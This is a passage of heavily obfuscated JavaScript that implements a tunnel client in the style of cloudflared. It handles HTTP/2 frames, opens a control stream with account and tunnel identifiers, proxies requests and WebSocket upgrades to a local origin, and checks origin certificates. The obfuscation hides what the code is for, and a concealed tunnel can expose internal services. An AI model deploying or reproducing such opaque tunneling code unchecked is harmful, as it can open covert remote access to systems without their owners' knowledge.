            }, b = await this[dG(0x49f)][dG(0x660)](0x9), c = b[dG(0x174)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dG(0x267)](b[dG(0x505)](0x5), 0x7fffffff), h = await this[dG(0x49f)][dG(0x660)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aW(0x775)](a, b, c) {
        const dH = a0aW, d = {
                'SZgcJ': function (g, h) {
                    return g > h;
                },
                'vkPvj': dH(0x1f0),
                'JBASg': function (g, h) {
                    return g - h;
                },
                'tbYQW': function (g, h) {
                    return g & h;
                },
                'BzRev': function (g, h) {
                    return g & h;
                },
                'ZcLot': function (g, h) {
                    return g !== h;
                }
            };
        if (a & 0x8) {
            const g = c[0x0];
            c = c['subarray'](0x1);
            if (d[dH(0x5ee)](g, c['length']))
                throw new Error(d[dH(0x7da)]);
            c = g ? c[dH(0x6a7)](0x0, d[dH(0x6a5)](c['length'], g)) : c;
        }
        d[dH(0x57b)](a, 0x20) && (c = c[dH(0x6a7)](0x5));
        const f = [c];
        while (!d['BzRev'](a, 0x4)) {
            const h = await this[dH(0x3bf)]();
            if (d['ZcLot'](h[0x0], 0x9) || d[dH(0x612)](h[0x2], b))
                throw new Error(dH(0x15b));
            f['push'](h[0x3]), a = h[0x1];
        }
        return this[dH(0x32a)][dH(0x305)](Buffer[dH(0x85e)](f));
    }
    ['openControl'](a) {
        const dI = a0aW, b = {
                'fUFzr': function (c, d) {
                    return c !== d;
                },
                'nQkmH': dI(0x44b),
                'cBLIW': dI(0x7e5)
            };
        if (b[dI(0x73f)](this[dI(0x588)], null))
            return;
        this[dI(0x588)] = new a0ay(this, a, this[dI(0x711)]), this[dI(0x847)](a, [[
                b['nQkmH'],
                b[dI(0x76b)]
            ]]), this['control']['start'](this['accountTag'], this[dI(0x3b8)], this['tunnelId'], this[dI(0x1ca)]);
    }
    [a0aW(0x5f7)](a, b) {
        const dJ = a0aW, c = {
                'vfmXw': function (g, h, i) {
                    return g(h, i);
                },
                'YBsKG': dJ(0x44b),
                'LwuCy': dJ(0x7e5),
                'YGoQw': dJ(0x1be),
                'lmPNN': dJ(0x5c5),
                'sdccp': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[dJ(0x4d3)](b[dJ(0x650)] ? b[dJ(0x491)](dJ(0x736)) : '{}'), h = c[dJ(0x6ea)](parseInt, g[dJ(0x5ae)], 0xa);
            !Number[dJ(0x6fc)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dJ(0x7e4)](JSON[dJ(0x7ce)]({ 'latestAppliedVersion': d }));
        this[dJ(0x847)](a, [
            [
                c[dJ(0x2ac)],
                c[dJ(0x358)]
            ],
            [
                c[dJ(0x5dd)],
                c[dJ(0x6b8)]
            ],
            [
                'content-length',
                c[dJ(0x465)](String, f[dJ(0x650)])
            ]
        ]), this[dJ(0x7ec)](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const dK = a0aW, c = {
                'LnmkS': function (d, f) {
                    return d === f;
                },
                'pZIra': dK(0x180)
            };
        if (c['LnmkS'](b[dK(0x889)], c[dK(0x4ee)])) {
            this[dK(0x5f7)](a, Buffer[dK(0x85e)](b[dK(0x41a)]));
            return;
        }
        if (b[dK(0x375)])
            return;
        if (b[dK(0x562)])
            return;
        b[dK(0x562)] = !![], this['proxyRequest'](a, b)[dK(0x2fa)](() => {
        });
    }
    async [a0aW(0x170)](a, b) {
        const dL = a0aW, c = {
                'iYJuv': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'gWyxu': function (d, f) {
                    return d === f;
                },
                'vsbPo': dL(0x398),
                'TwneB': dL(0x737),
                'kVVJM': dL(0x699),
                'zijaA': dL(0x889),
                'npZKl': function (d, f) {
                    return d(f);
                },
                'xBNCP': function (d, f) {
                    return d === f;
                },
                'DzDIJ': dL(0x44b),
                'YHtSw': dL(0x85b),
                'UQXHw': dL(0x209),
                'ZJDoA': function (d, f) {
                    return d + f;
                },
                'MbLJK': dL(0x684),
                'ZDUTp': dL(0x16b),
                'cYxGG': dL(0x2a7)
            };
        try {
            const d = await c[dL(0x548)](a0aB, this[dL(0x54c)], b[dL(0x717)], b[dL(0x2be)], b['headers'], Buffer['concat'](b['body'])), f = [], g = [];
            for (const [k, l] of d[dL(0x254)]) {
                const m = k[dL(0x40a)]();
                c['gWyxu'](m, dL(0x788)) && g['push']([
                    m,
                    l
                ]);
                const n = m[dL(0x2eb)](c['vsbPo']) || m[dL(0x2eb)](c[dL(0x477)]) || m[dL(0x2eb)]('cf-proxy-') || m['startsWith'](':');
                (!n || c[dL(0x632)](m, c[dL(0x637)]) || c[dL(0x632)](m, c[dL(0x7d0)]) || c[dL(0x632)](m, dL(0x5a9))) && f[dL(0x24a)]([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === dL(0x1be))) {
                const o = c['npZKl'](a0aq, b['path']);
                o && f[dL(0x24a)]([
                    dL(0x1be),
                    o
                ]);
            }
            const h = a0au(f), i = c['xBNCP'](d['status'], 0x65) ? 0xc8 : d['status'], j = [
                    [
                        c[dL(0x392)],
                        c[dL(0x54b)](String, i)
                    ],
                    ...g,
                    [
                        c[dL(0x4dc)],
                        h
                    ],
                    [
                        dL(0x3e6),
                        c['UQXHw']
                    ]
                ];
            this[dL(0x847)](a, j);
            for await (const p of d[dL(0x41a)]) {
                await this['sendData'](a, p, ![]);
            }
            await this[dL(0x7ec)](a, Buffer[dL(0x605)](0x0), !![]);
        } catch (q) {
            this[dL(0x711)][dL(0x71c)](c['ZJDoA'](c[dL(0x6f9)](c[dL(0x657)], a), c[dL(0x400)]) + q);
            try {
                this[dL(0x847)](a, [[
                        c[dL(0x392)],
                        c[dL(0x526)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aW(0x62f)]() {
        const dM = a0aW, a = {
                'tSbpI': dM(0x48f),
                'iDbhC': function (d, f) {
                    return d + f;
                },
                'DlBZg': function (d, f) {
                    return d & f;
                },
                'hQBzg': function (d, f) {
                    return d % f;
                },
                'suejj': 'invalid\x20SETTINGS\x20payload',
                'LRvVA': function (d, f) {
                    return d < f;
                },
                'ccyTU': function (d, f) {
                    return d === f;
                },
                'mIueq': function (d, f) {
                    return d - f;
                },
                'cjRrd': function (d, f) {
                    return d === f;
                },
                'umccj': function (d, f) {
                    return d === f;
                },
                'zEQur': function (d, f) {
                    return d === f;
                },
                'zQGQf': function (d, f) {
                    return d !== f;
                },
                'ewcSa': function (d, f) {
                    return d + f;
                }
            }, b = await this[dM(0x49f)]['readExact'](0x18);
        if (!b[dM(0x86b)](Buffer[dM(0x7e4)]('PRI\x20*\x20HTTP/2.0\x0d\x0a\x0d\x0aSM\x0d\x0a\x0d\x0a')))
            throw new Error(a[dM(0x316)]);
        const c = Buffer[dM(0x605)](0x6);
        c[dM(0x7ae)](0x3, 0x0), c[dM(0x5d6)](0x64, 0x2), this[dM(0x5b0)](0x4, 0x0, 0x0, c);
        this[dM(0x585)] && !this[dM(0x6d9)][dM(0x312)] && (process[dM(0x4d6)][dM(0x805)](a[dM(0x179)](this[dM(0x793)], '\x0a')), this[dM(0x6d9)]['printed'] = !![]);
        try {
            while (!this[dM(0x672)]) {
                const [d, f, g, h] = await this[dM(0x3bf)]();
                if (d === 0x4) {
                    if (!a['DlBZg'](f, 0x1)) {
                        if (a['hQBzg'](h[dM(0x650)], 0x6))
                            throw new Error(a['suejj']);
                        for (let i = 0x0; a[dM(0x197)](i, h[dM(0x650)]); i += 0x6) {
                            const j = h['readUInt16BE'](i), k = h['readUInt32BE'](i + 0x2);
                            if (a['ccyTU'](j, 0x4)) {
                                const l = a[dM(0x56d)](k, 0xffff);
                                for (const m of this[dM(0x450)][dM(0x551)]()) {
                                    this[dM(0x450)][dM(0x5ef)](m, Math[dM(0x58e)](0x0, this['streamWindows']['get'](m) + l));
                                }
                            } else
                                a[dM(0x31c)](j, 0x5) && k >= 0x4000 && k <= 0xffffff && (this[dM(0x5e1)] = k);
                        }
                        this[dM(0x5b0)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[dM(0x262)](d, 0x6)) {
                    !a['DlBZg'](f, 0x1) && this[dM(0x5b0)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[dM(0x3c8)](d, 0x8)) {
                    if (a[dM(0x851)](h[dM(0x650)], 0x4))
                        continue;
                    const n = h[dM(0x505)](0x0) & 0x7fffffff;
                    a[dM(0x262)](g, 0x0) ? this[dM(0x6e4)] += n : this[dM(0x450)][dM(0x5ef)](g, a[dM(0x673)](this[dM(0x450)]['get'](g) ?? 0xffff, n));
                    this[dM(0x202)]();
                    continue;
                }
                if (d === 0x3) {
                    this['streams'][dM(0x317)](g);
                    continue;
                }
                if (d === 0x7)
                    break;
                if (d === 0x1) {
                    const o = await this[dM(0x775)](f, g, h);
                    !this[dM(0x450)][dM(0x865)](g) && this[dM(0x450)][dM(0x5ef)](g, 0xffff);
                    this[dM(0x574)](g, f, o);
                    continue;
                }
                if (a['zEQur'](d, 0x0)) {
                    this[dM(0x150)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[dM(0x672)] = !![], this[dM(0x4c6)]();
            for (const p of this['streams']['values']()) {
                p[dM(0x631)] && p[dM(0x631)][dM(0x339)]();
            }
            try {
                this[dM(0x303)]['destroy']();
            } catch (q) {
            }
        }
    }
    [a0aW(0x574)](a, b, c) {
        const dN = a0aW, d = {
                'kQGcI': function (i, j) {
                    return i === j;
                },
                'ujpld': ':method',
                'lfNme': dN(0x4b8),
                'lWRXR': ':path',
                'rMXIA': dN(0x375),
                'FRqvg': function (i, j) {
                    return i === j;
                },
                'KkmlQ': dN(0x792),
                'hfJAa': function (i, j) {
                    return i(j);
                },
                'pQvfa': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i['startsWith'](':') ? f[i] = j : f[i[dN(0x40a)]()] = j;
        }
        const g = (f[a0a3] || '')[dN(0x343)]()[dN(0x40a)]();
        if (d['kQGcI'](g, a0a4)) {
            this[dN(0x53e)](a);
            b & 0x1 && (this[dN(0x588)]['finished'] = !![]);
            return;
        }
        const h = {
            'method': f[d[dN(0x2ed)]] || d[dN(0x2a2)],
            'path': f[d[dN(0x601)]] || '/',
            'authority': f[dN(0x886)] || '',
            'headers': c[dN(0x3cc)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': g === d[dN(0x439)] || d['FRqvg']((f[d[dN(0x14c)]] || '')['toLowerCase'](), d['rMXIA']),
            'ended': d['hfJAa'](Boolean, d['pQvfa'](b, 0x1)),
            'finished': ![]
        };
        this[dN(0x4ab)][dN(0x5ef)](a, h);
        if (h[dN(0x375)])
            h[dN(0x631)] = new a0ax(this, a, h, this['origin'], this[dN(0x711)]), h[dN(0x631)]['start']();
        else
            h[dN(0x168)] && this['requestFinished'](a, h);
    }
    [a0aW(0x150)](a, b, c) {
        const dO = a0aW, d = {
                'BZRcn': function (g, h) {
                    return g !== h;
                },
                'fgmKI': function (g, h) {
                    return g === h;
                },
                'XglTq': function (g, h) {
                    return g & h;
                },
                'cYPAo': function (g, h) {
                    return g === h;
                },
                'HdPNX': function (g, h) {
                    return g(h);
                }
            };
        this[dO(0x193)](0x0, c['length']), this[dO(0x193)](a, c[dO(0x650)]);
        if (d[dO(0x59d)](this[dO(0x588)], null) && d[dO(0x708)](this[dO(0x588)]['streamId'], a)) {
            this[dO(0x588)][dO(0x2ae)](c);
            d[dO(0x5ab)](b, 0x1) && (this['control'][dO(0x562)] = !![]);
            return;
        }
        const f = this['streams'][dO(0x225)](a);
        if (d['cYPAo'](f, undefined))
            return;
        if (f[dO(0x631)] !== undefined) {
            f[dO(0x631)][dO(0x2ae)](c, d[dO(0x2c3)](Boolean, b & 0x1));
            return;
        }
        c[dO(0x650)] && f[dO(0x41a)][dO(0x24a)](c), d['XglTq'](b, 0x1) && (f[dO(0x168)] = !![], this[dO(0x3fc)](a, f));
    }
}
class a0ax {
    constructor(a, b, c, d, f) {
        const dP = a0aW, g = { 'LMCIM': '2|6|5|3|0|4|8|7|1' }, h = g['LMCIM'][dP(0x4c0)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this['log'] = f;
                continue;
            case '1':
                this[dP(0x303)] = null;
                continue;
            case '2':
                this[dP(0x699)] = a;
                continue;
            case '3':
                this[dP(0x54c)] = d;
                continue;
            case '4':
                this['queue'] = [];
                continue;
            case '5':
                this[dP(0x4e5)] = c;
                continue;
            case '6':
                this['streamId'] = b;
                continue;
            case '7':
                this[dP(0x672)] = ![];
                continue;
            case '8':
                this['waiters'] = [];
                continue;
            }
            break;
        }
    }
    [a0aW(0x433)]() {
        const dQ = a0aW;
        this[dQ(0x62f)]()['catch'](() => {
        });
    }
    [a0aW(0x2ae)](a, b = ![]) {
        const dR = a0aW;
        a['length'] && this[dR(0x719)]['push'](a), b && this['queue'][dR(0x24a)](null), this[dR(0x634)]();
    }
    [a0aW(0x339)]() {
        const dS = a0aW, a = {
                'YzDxb': function (b, c) {
                    return b !== c;
                }
            };
        if (this['stopped'])
            return;
        this[dS(0x672)] = !![], this['_wake']();
        if (a[dS(0x30b)](this[dS(0x303)], null))
            try {
                this[dS(0x303)][dS(0x2ef)]();
            } catch (b) {
            }
    }
    [a0aW(0x634)]() {
        const dT = a0aW, a = {
                'biBZD': function (b) {
                    return b();
                }
            };
        for (const b of this[dT(0x3e8)]) {
            a[dT(0x2ea)](b);
        }
        this[dT(0x3e8)] = [];
    }
    async [a0aW(0x492)]() {
        const dU = a0aW;
        while (!this[dU(0x672)]) {
            if (this[dU(0x719)][dU(0x650)])
                return this[dU(0x719)][dU(0x61f)]();
            await new Promise(a => this[dU(0x3e8)][dU(0x24a)](a));
        }
        return null;
    }
    async [a0aW(0x62f)]() {
        const dV = a0aW, a = {
                'enrDT': function (b, c) {
                    return b(c);
                },
                'CljsW': function (b, c) {
                    return b(c);
                },
                'YaltQ': dV(0x398),
                'MUITM': 'cf-cloudflared-',
                'MlyXs': dV(0x610),
                'RJJZA': function (b, c) {
                    return b === c;
                },
                'qxjKe': dV(0x699),
                'SsJZw': dV(0x889),
                'IfofE': function (b, c) {
                    return b === c;
                },
                'FJLYS': dV(0x5a9),
                'QeqCz': dV(0x44b),
                'szaEe': function (b, c) {
                    return b(c);
                },
                'hnJdl': dV(0x85b),
                'LNdAi': dV(0x3e6),
                'wdjyW': dV(0x209),
                'xQdlg': function (b, c) {
                    return b + c;
                },
                'ysxww': dV(0x583),
                'PrWEz': dV(0x2a7)
            };
        try {
            this[dV(0x303)] = await a['enrDT'](a0az, this[dV(0x54c)]), this[dV(0x7b5)]();
            const b = await a[dV(0x6c3)](a0aC, this[dV(0x303)]), c = [], d = [];
            for (const [i, j] of b[dV(0x254)]) {
                const k = i['toLowerCase']();
                k === dV(0x788) && d[dV(0x24a)]([
                    k,
                    j
                ]);
                const l = k[dV(0x2eb)](a['YaltQ']) || k['startsWith'](a[dV(0x866)]) || k[dV(0x2eb)](a[dV(0x240)]) || k[dV(0x2eb)](':');
                (!l || a['RJJZA'](k, a['qxjKe']) || k === a['SsJZw'] || a[dV(0x816)](k, a[dV(0x815)])) && c[dV(0x24a)]([
                    k,
                    j
                ]);
            }
            const f = a0au(c), g = a[dV(0x816)](b[dV(0x7dc)], 0x65) ? 0xc8 : b['status'], h = [
                    [
                        a[dV(0x84d)],
                        a[dV(0x47b)](String, g)
                    ],
                    ...d,
                    [
                        a['hnJdl'],
                        f
                    ],
                    [
                        a[dV(0x45e)],
                        a[dV(0x3ff)]
                    ]
                ];
            this[dV(0x699)][dV(0x847)](this['streamId'], h), this['writeToOrigin']()[dV(0x2fa)](() => {
            }), await this[dV(0x4f6)](b[dV(0x7fa)]);
        } catch (m) {
            this[dV(0x711)]['warning'](a[dV(0x5b8)](a[dV(0x5b8)](dV(0x571), this['streamId']), a[dV(0x6f5)]) + m);
            try {
                this['connection']['sendHeaders'](this[dV(0x564)], [[
                        a[dV(0x84d)],
                        a[dV(0x658)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[dV(0x339)]();
        }
    }
    async ['pumpOrigin'](a) {
        const dW = a0aW;
        a['length'] && await this[dW(0x699)][dW(0x7ec)](this[dW(0x564)], a, ![]);
        for await (const b of this[dW(0x303)]) {
            if (this[dW(0x672)])
                break;
            await this[dW(0x699)][dW(0x7ec)](this[dW(0x564)], b, ![]);
        }
        !this['stopped'] && await this['connection'][dW(0x7ec)](this[dW(0x564)], Buffer['alloc'](0x0), !![]);
    }
    async [a0aW(0x73a)]() {
        const dX = a0aW;
        while (!this[dX(0x672)]) {
            const a = await this[dX(0x492)]();
            if (a === null)
                return;
            try {
                this[dX(0x303)][dX(0x805)](a);
            } catch (b) {
                this[dX(0x672)] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const dY = a0aW, a = {
                'UEZug': function (i, j) {
                    return i + j;
                },
                'PCDuJ': dY(0x1fd),
                'CUDoU': dY(0x7a0),
                'WFsIZ': function (i, j) {
                    return i === j;
                },
                'SeZwm': 'connection',
                'XtpYg': dY(0x889),
                'OKLyO': dY(0x498),
                'CvCrE': 'sec-websocket-version',
                'VzSTj': 'origin',
                'QYcpV': function (i, j) {
                    return i + j;
                },
                'EAxrT': function (i, j) {
                    return i + j;
                },
                'QtQqv': dY(0x857),
                'ghZEI': function (i, j) {
                    return i + j;
                },
                'yfCQI': dY(0x841),
                'eHsBX': function (i, j) {
                    return i + j;
                },
                'OUwFh': dY(0x7f9),
                'WMFJq': 'Sec-WebSocket-Version:\x2013',
                'XGHud': dY(0x3b5),
                'MTOgP': function (i, j) {
                    return i + j;
                },
                'Jbffm': dY(0x6e8),
                'PkMOS': dY(0x27e)
            }, b = new URL(this[dY(0x54c)]), c = this[dY(0x4e5)][dY(0x2be)][dY(0x2eb)]('/') ? this[dY(0x4e5)][dY(0x2be)] : a['UEZug']('/', this[dY(0x4e5)]['path']), d = [a[dY(0x51b)](a[dY(0x196)] + c, a[dY(0x75a)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request'][dY(0x254)]) {
            const k = i[dY(0x40a)]();
            if (a[dY(0x4f5)](k, dY(0x239)) || k === a[dY(0x23b)] || a[dY(0x4f5)](k, a[dY(0x19e)]) || k === dY(0x788) || a[dY(0x4f5)](k, a['OKLyO']))
                continue;
            if (a[dY(0x4f5)](k, dY(0x63a)))
                f = !![];
            else {
                if (a[dY(0x4f5)](k, a[dY(0x1f1)]))
                    g = !![];
                else
                    a[dY(0x4f5)](k, a[dY(0x5d8)]) && (h = !![]);
            }
            d[dY(0x24a)](a[dY(0x51b)](a[dY(0x1ed)](i, ':\x20'), j));
        }
        d['push'](a['EAxrT'](a['QtQqv'], b[dY(0x239)])), !h && this[dY(0x4e5)][dY(0x503)] && d[dY(0x24a)](a[dY(0x4a1)](a[dY(0x664)], this[dY(0x4e5)][dY(0x503)])), !f && d[dY(0x24a)](a['eHsBX']('Sec-WebSocket-Key:\x20', a0k[dY(0x273)](0x10)[dY(0x491)](a[dY(0x61d)]))), !g && d[dY(0x24a)](a[dY(0x27c)]), d['push'](dY(0x63c)), d[dY(0x24a)](a[dY(0x799)]), this[dY(0x303)][dY(0x805)](Buffer[dY(0x7e4)](a[dY(0x234)](d[dY(0x2f9)]('\x0d\x0a'), a['Jbffm']), a[dY(0x28f)]));
    }
}
class a0ay {
    constructor(a, b, c) {
        const dZ = a0aW, d = { 'TUcDu': '3|2|0|4|1' }, f = d[dZ(0x416)][dZ(0x4c0)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[dZ(0x711)] = c;
                continue;
            case '1':
                this['finished'] = ![];
                continue;
            case '2':
                this[dZ(0x564)] = b;
                continue;
            case '3':
                this['connection'] = a;
                continue;
            case '4':
                this['buffer'] = Buffer[dZ(0x605)](0x0);
                continue;
            }
            break;
        }
    }
    [a0aW(0x433)](a, b, c, d) {
        const e0 = a0aW, f = {
                'rcGNJ': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[e0(0x699)][e0(0x7ec)](this[e0(0x564)], a0aj(0x0), ![]), this['connection'][e0(0x7ec)](this['streamId'], f[e0(0x381)](a0ak, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aW(0x2ae)](a) {
        const e1 = a0aW, b = {
                'AJOFO': function (f, g) {
                    return f(g);
                },
                'RCdBv': function (f, g) {
                    return f + g;
                },
                'RjHiM': e1(0x2b6),
                'lfwbs': function (f, g) {
                    return f + g;
                },
                'lRXxQ': e1(0x53a),
                'fOtJH': 'unknown\x20error',
                'PWDYU': function (f, g) {
                    return f + g;
                },
                'bZSMe': e1(0x17b)
            };
        this[e1(0x2fd)] = this['buffer'][e1(0x650)] ? Buffer['concat']([
            this['buffer'],
            a
        ]) : a;
        let c, d;
        [c, d] = b[e1(0x554)](a0al, this['buffer']), this[e1(0x2fd)] = d;
        for (const f of c) {
            try {
                const g = b[e1(0x554)](a0ao, f);
                g['ok'] ? (this[e1(0x711)][e1(0x4dd)](b[e1(0x1ba)](b[e1(0x542)], g[e1(0x389)] || 'unknown')), this['connection'][e1(0x36f)] = !![]) : (this['log']['warning'](b[e1(0x199)](b['lRXxQ'], g[e1(0x5e7)] || b[e1(0x230)])), this['connection'][e1(0x357)] = !![], this[e1(0x699)][e1(0x672)] = !![]);
            } catch (h) {
                this[e1(0x711)][e1(0x768)](b[e1(0x5fe)](b[e1(0x247)], h));
            }
        }
    }
}
function a0az(a) {
    const e2 = a0aW, b = {
            'wBWSU': function (c, d, f) {
                return c(d, f);
            },
            'GfSQI': e2(0x5e7),
            'vYMhd': e2(0x5ca),
            'ZImmr': '0|3|1|4|2',
            'xUDjJ': e2(0x43b),
            'WPVkG': e2(0x518),
            'OXIEr': function (c, d) {
                return c(d);
            },
            'gXTNq': function (c, d) {
                return c === d;
            },
            'Kuwga': 'connect'
        };
    return new Promise((c, d) => {
        const e3 = e2, f = {
                'aWpIu': b[e3(0x6ff)],
                'AAGpT': b[e3(0x84e)],
                'kmZwe': function (n, o) {
                    return n(o);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            d(new Error(b[e3(0x5d2)]));
            return;
        }
        if (![
                e3(0x74a),
                b['WPVkG']
            ][e3(0x41d)](g['protocol']) || !g[e3(0x69c)]) {
            b['OXIEr'](d, new Error(b[e3(0x5d2)]));
            return;
        }
        const h = b[e3(0x74b)](g['protocol'], b[e3(0x249)]), i = g[e3(0x470)] || (h ? 0x1bb : 0x50), j = a0i[e3(0x47a)]({
                'host': g[e3(0x69c)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const e4 = e3, q = f[e4(0x783)][e4(0x4c0)]('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        if (k)
                            return;
                        continue;
                    case '1':
                        j[e4(0x2af)](f[e4(0x19d)], m);
                        continue;
                    case '2':
                        f[e4(0x573)](o, p);
                        continue;
                    case '3':
                        k = !![];
                        continue;
                    case '4':
                        j['setTimeout'](0x0);
                        continue;
                    }
                    break;
                }
            }, m = o => {
                !k && l(d, o);
            };
        j['on'](b['GfSQI'], m), j['setTimeout'](0x7530, () => j[e3(0x2ef)](new Error(e3(0x57e)))), j['on'](b[e3(0x5ff)], () => {
            const e6 = e3, o = {
                    'edHqb': function (q, r, s) {
                        const e5 = a0b;
                        return b[e5(0x7bf)](q, r, s);
                    }
                };
            if (!h) {
                l(c, j);
                return;
            }
            const p = a0j[e6(0x47a)]({
                'socket': j,
                'servername': g[e6(0x69c)]
            });
            p['on'](b['GfSQI'], q => {
                const e7 = e6;
                !k && o[e7(0x7ee)](l, d, q);
            }), p['on'](b[e6(0x589)], () => {
                const e8 = e6;
                o[e8(0x7ee)](l, c, p);
            });
        });
    });
}
function a0aA(a) {
    const e9 = a0aW, b = {
            'WZzWO': function (d, f) {
                return d < f;
            },
            'wDpNu': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[e9(0x65f)](d, a[e9(0x751)][e9(0x650)]); d += 0x2) {
        c[e9(0x24a)]([
            a[e9(0x751)][d],
            a['rawHeaders'][b[e9(0x67a)](d, 0x1)]
        ]);
    }
    return c;
}
function a0aB(a, b, c, d, f) {
    const ea = a0aW, g = {
            'nbsMT': function (h, i) {
                return h(i);
            },
            'WysqQ': function (h, i) {
                return h(i);
            },
            'FIVOn': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'SuACa': ea(0x518),
            'gLElu': function (h, i) {
                return h(i);
            },
            'BXYuS': ea(0x239),
            'TQWma': function (h, i) {
                return h === i;
            },
            'FSPzX': function (h, i) {
                return h === i;
            },
            'mhdup': 'transfer-encoding',
            'bsODB': function (h, i) {
                return h === i;
            },
            'VMCdK': ea(0x788),
            'qKazH': function (h, i) {
                return h + i;
            },
            'JnrEW': ea(0x5e7)
        };
    return new Promise((h, i) => {
        const ed = ea, j = {
                'ibuGH': function (r, s) {
                    const eb = a0b;
                    return g[eb(0x373)](r, s);
                },
                'QBxAD': function (r, s) {
                    const ec = a0b;
                    return g[ec(0x373)](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            g['WysqQ'](i, new Error(g[ed(0x406)]));
            return;
        }
        if (![
                ed(0x74a),
                g['SuACa']
            ][ed(0x41d)](k['protocol']) || !k[ed(0x69c)]) {
            g['gLElu'](i, new Error(g[ed(0x406)]));
            return;
        }
        const l = k[ed(0x2cc)] === g['SuACa'], m = k[ed(0x470)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s['toLowerCase']();
            if (u === g[ed(0x1dc)] || g[ed(0x81f)](u, ed(0x699)) || g[ed(0x66f)](u, g[ed(0x44c)]) || g[ed(0x7a3)](u, g[ed(0x68f)]))
                continue;
            n[s] = t;
        }
        n[ed(0x749)] = k[ed(0x239)];
        f['length'] && (n['Content-Length'] = String(f[ed(0x650)]));
        const o = c[ed(0x2eb)]('/') ? c : g[ed(0x45b)]('/', c), p = l ? a0h : a0g, q = p['request']({
                'hostname': k[ed(0x69c)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const ee = ed;
                j['ibuGH'](h, {
                    'status': v[ee(0x475)],
                    'headers': j['QBxAD'](a0aA, v),
                    'body': v
                });
            });
        q['on'](g[ed(0x35f)], v => i(v)), q[ed(0x342)](f['length'] ? f : undefined);
    });
}
function a0aC(a) {
    const ef = a0aW, b = {
            'aglMC': ef(0x64d),
            'vYvFl': 'error',
            'GukkS': ef(0x342),
            'CFLVD': '\x0d\x0a\x0d\x0a',
            'WJvje': function (c, d) {
                return c < d;
            },
            'fzPyd': function (c) {
                return c();
            },
            'ZIjlL': 'latin1',
            'OFOrc': function (c, d, f) {
                return c(d, f);
            },
            'mMYmE': function (c, d) {
                return c(d);
            },
            'JryNY': function (c, d) {
                return c < d;
            },
            'geiYh': function (c, d) {
                return c > d;
            },
            'orbXK': function (c, d) {
                return c + d;
            },
            'pLDJS': function (c) {
                return c();
            },
            'Ozexb': function (c) {
                return c();
            }
        };
    return new Promise((c, d) => {
        const eh = ef, f = {
                'sQZkP': function (l) {
                    const eg = a0b;
                    return b[eg(0x369)](l);
                }
            };
        let g = Buffer[eh(0x605)](0x0);
        const h = () => {
                const ei = eh;
                a[ei(0x2af)](b[ei(0x515)], i), a['removeListener'](b[ei(0x4fb)], j), a[ei(0x2af)](b[ei(0x5bb)], k), a[ei(0x2af)]('close', k);
            }, i = l => {
                const ej = eh;
                g = g[ej(0x650)] ? Buffer['concat']([
                    g,
                    l
                ]) : l;
                const m = g[ej(0x681)](b[ej(0x615)]);
                if (b[ej(0x1b1)](m, 0x0))
                    return;
                b[ej(0x789)](h);
                const n = g['subarray'](0x0, m)[ej(0x491)](b[ej(0x1c0)]), o = n[ej(0x4c0)]('\x0d\x0a'), p = o[0x0]['split']('\x20'), q = b[ej(0x76c)](parseInt, p[0x1], 0xa);
                if (!Number[ej(0x70a)](q)) {
                    b[ej(0x1fa)](d, new Error('malformed\x20HTTP/1.1\x20response\x20status'));
                    return;
                }
                const r = [];
                for (let s = 0x1; b[ej(0x3d9)](s, o['length']); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[ej(0x681)](':');
                    b[ej(0x15d)](u, 0x0) && r['push']([
                        t[ej(0x500)](0x0, u)['trim'](),
                        t[ej(0x500)](b[ej(0x21b)](u, 0x1))['trim']()
                    ]);
                }
                b['mMYmE'](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[ej(0x6a7)](b[ej(0x21b)](m, 0x4))
                });
            }, j = l => {
                const ek = eh;
                f[ek(0x1e4)](h), d(l);
            }, k = () => {
                const el = eh;
                b[el(0x332)](h), d(new Error(el(0x224)));
            };
        a['on'](b['aglMC'], i), a['on'](b[eh(0x4fb)], j), a['on'](b[eh(0x5bb)], k), a['on'](eh(0x1e9), k);
    });
}
function a0aD(a) {
    const em = a0aW, b = {
            'VwCYd': em(0x49e),
            'EwsVo': function (f, g) {
                return f === g;
            },
            'NOwHr': function (f, g) {
                return f === g;
            },
            'RnriO': em(0x523),
            'ginwa': em(0x2f3),
            'NkZGs': em(0x6de),
            'fJenU': function (f, g) {
                return f + g;
            },
            'KnTYa': 'issuer\x20O\x20mismatch:\x20',
            'cWpCJ': function (f, g) {
                return f(g);
            },
            'Akbpu': em(0x4c5),
            'tdDcM': function (f, g) {
                return f + g;
            },
            'pLDAr': function (f, g) {
                return f !== g;
            },
            'kEcdS': 'CloudFlare\x20Origin\x20Certificate'
        };
    if (!a || !a[em(0x4c4)])
